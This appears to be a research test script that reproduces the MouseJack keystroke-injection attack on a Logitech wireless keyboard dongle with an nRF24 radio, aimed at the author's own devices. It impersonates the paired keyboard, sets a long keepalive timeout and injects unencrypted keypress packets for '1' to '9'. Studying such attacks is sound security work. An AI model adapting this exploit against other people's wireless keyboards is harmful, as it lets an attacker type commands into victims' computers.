import time
import sys
from os.path import dirname

'''
Appending the project root folder to sys.path so that we can import modules from other directories (radio_agent for example).
Simply using a relative import such as: from ..radio_agent import nrf24, would NOT work since any script that uses
explicit relative imports cannot be run directly, but this is a script we want to run.
To reach the path of the project root in a general way (regardless of the current working directory), we use the __file__ variable
which stores the full path of this file, then call os.path.dirname twice to get only the path of the parent of the tests directory.
To be fully confident, we also have a launch.json file that assigns the workspace folder as the value of the PYTHONPATH environment variable,
making sure everything can run smoothly within VS Code as well.
'''
sys.path.append(dirname(dirname(__file__)))
from radio_agent import nrf24
from utils.hid_scan_codes import *
from utils.general_utils import *

def main():
    # E4:ED:AE:B8:B4 is an RF address of a Logitech MK345 keyboard that I (Ron) own.
    # It MUST be written backwards, because when it's sent to the attacking dongle (by calling enter_sniffer_mode), it is written to some register
    # in the nRF24 chip using an SPI command. This can be deduced by following the flow of function calls in the research firmware code, starting here:
    # https://github.com/BastilleResearch/nrf-research-firmware/blob/master/src/radio.c#L98
    # According to page 53 here: https://www.rcscomponents.kiev.ua/datasheets/nrf24lu1-f16q32-t.pdf, data bytes in SPI commands must be ordered from LSByte to MSByte.
    address = [0xB4, 0xB8, 0xAE, 0xED, 0xE4]
    #address = [0xA4, 0x35, 0xE3, 0x7C, 0x81] # Birman mouse
    #address = [0xA4, 0x0C, 0xA8, 0xAB, 0xFA] # FA:AB:A8:0C:A4 is an RF address of a Logitech MK345 mouse that I (Ron) own

    # initialize the radio
    radio = nrf24.nrf24()

    '''
    STEP 1: in order to communicate with the victim dongle, we must identify the frequency channel it uses to communicate with its paired device.
    We can pretend to be that device (since we have its address), and repeatedly send an arbitrary "ping" payload to the victim dongle, using a different channel each time.
    We do this until an ACK is received from the dongle, meaning we found the right channel.
    '''
    _ = find_address_channel(radio, address)

    '''
    STEP 2: injecting keystrokes of '1' to '9'. But there is a problem - the dongle and paired device could move to a different channel while we do this,
    thus breaking the attack. According to the whitepaper, they remain on the same channel as long as there is no packet loss. To indicate this, the device
    sends periodic keepalive packets to its dongle. It has to do so within a known interval/timeout, which is set by the device. If the timeout has passed without
    the dongle receiving a keepalive packet from the device, they move to a different channel. In addition, even if all keepalives are delivered on time, but the device is idle,
    the keepalive interval/timeout is increased every once in a while. But that's less important.
    The whitepaper states that in order to perform a successful attack, "an attacker needs to mimic the keepalive behavior used by Unifying keyboards and mice".
    So we first send the dongle a packet that sets a relatively long keepalive timeout, and then transmit keepalives very frequently. This way we can be confident
    that there won't be a timeout that would cause the dongle to switch channels unexpectedly.
    '''
    hid_scan_codes_1_to_9 = [KEY_1, KEY_2, KEY_3, KEY_4, KEY_5, KEY_6, KEY_7, KEY_8, KEY_9]

    # transmitting payload that sets the keepalive timeout to 1200ms (=0x4B0)
    radio.transmit_payload(SET_KEEPALIVE_TIMEOUT_PAYLOAD)
    time.sleep(SLEEPING_PERIOD) # sleeping for 12ms

    # transmitting '1' to '9'
    for key in hid_scan_codes_1_to_9:
        # refer to Table 8 in the MouseJack whitepaper: Logitech Unencrypted Keystroke Payload
        radio.transmit_payload(with_checksum([0x00, 0xC1, 0x00, key, 0x00, 0x00, 0x00, 0x00, 0x00])) # third byte is always zero because it's the modifier mask (e.g. Ctrl, Shift, Alt...) which we don't need
        time.sleep(SLEEPING_PERIOD) # sleeping for 12ms
        radio.transmit_payload(KEEPALIVE_PAYLOAD) # transmitting keepalive after each keystroke
    # at the end, transmitting a key release packet (scan code = 0x00), otherwise it would keep typing '9' forever
    radio.transmit_payload(with_checksum([0x00, 0xC1, 0x00, KEY_RELEASE, 0x00, 0x00, 0x00, 0x00, 0x00]))

if __name__ == "__main__":
    main()
